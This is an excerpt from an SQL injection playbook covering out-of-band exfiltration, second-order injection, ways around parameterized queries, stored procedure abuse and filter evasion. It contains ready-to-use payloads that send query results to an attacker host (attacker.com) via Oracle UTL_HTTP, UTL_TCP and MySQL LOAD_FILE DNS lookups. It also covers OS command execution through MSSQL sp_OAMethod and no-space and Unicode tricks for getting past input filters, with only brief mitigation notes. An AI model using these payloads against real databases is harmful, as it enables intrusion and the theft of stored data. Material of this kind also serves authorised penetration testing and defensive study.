...
## Advanced Technical Reference (from sqli-playbook)

### Out-of-Band (OOB) Exfiltration

Use when blind injection has no time/boolean indicator, or when batch queries can't return data inline.

**MSSQL — OpenRowSet** (requires SQLOLEDB, outbound TCP. Use port 80/443 to bypass firewall egress):
```sql
...
**Oracle — UTL_HTTP** (HTTP GET with data in URL path, supports proxy):
```sql
'+UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT username FROM all_users WHERE ROWNUM=1))--
```

**Oracle — UTL_INADDR** (DNS exfiltration, often bypasses HTTP egress restrictions):
```sql
...
**Oracle — UTL_SMTP / UTL_TCP** (email large data dumps or raw TCP socket):
```sql
UTL_SMTP.SENDMAIL(...)   -- send query results via email
UTL_TCP.OPEN_CONNECTION('attacker.com', 80)
```

**MySQL — DNS via LOAD_FILE** (Windows + UNC path, triggers DNS lookup before connection):
```sql
SELECT LOAD_FILE('\\\\attacker.com\\share')
```

**MySQL — INTO OUTFILE** (in-band filesystem write, requires FILE + writable web root + `secure_file_priv=''`):
```sql
...
User input is stored safely (parameterized), but later **retrieved as trusted data** and concatenated into a new query without re-sanitization.

**Example flow:**
1. Register username: `admin'--`
2. Application safely inserts this into users table via parameterized query
...
**Key insight:** Any function that reads stored data and uses it in a new DB query is a second-order candidate. Review: password change, profile update, admin action on user data, batch processing, reporting pipelines.

### Parameterized Query Bypass Scenarios
...
1. **Table/column names are user-controlled** — params can't parameterize identifiers:
   ```sql
   "SELECT * FROM " + tableName + " WHERE id = ?"   -- UNSAFE
   ```
   Mitigation: whitelist-validate table/column names.

2. **Partial parameterization** — some fields concatenated, others parameterized:
   ```sql
   "SELECT * FROM users WHERE type='" + userType + "' AND id=?"  -- UNSAFE
   ```

3. **IN clause with dynamic count** (common ORM mistake):
   ```sql
...
5. **PDO emulated prepares** — when `PDO::ATTR_EMULATE_PREPARES=true`, stacked queries work even with parameterized-looking code.

### Stored Procedure Abuse

**MSSQL — sp_OAMethod** (COM automation for OS command execution):
```sql
DECLARE @o INT
...
**Oracle — DBMS_LDAP** (outbound LDAP = DNS exfil, exfiltrate via LDAP INIT):
```sql
...
- **Unicode tricks:** `U+02BA` (modifier letter double prime) → `"`, `U+02B9` (modifier letter prime) → `'`, `%%2727` → `%27` → `'`

### No-Space / No-Comma Bypass

**No-Space variants:**
```sql
SELECT/**/username/**/FROM/**/users
SELECT(username)FROM(users)         -- parens replace spaces in some contexts
...
-- SUBSTRING without comma: SUBSTRING('abc' FROM 1 FOR 1)
-- LIMIT without comma: LIMIT 1 OFFSET 0
```
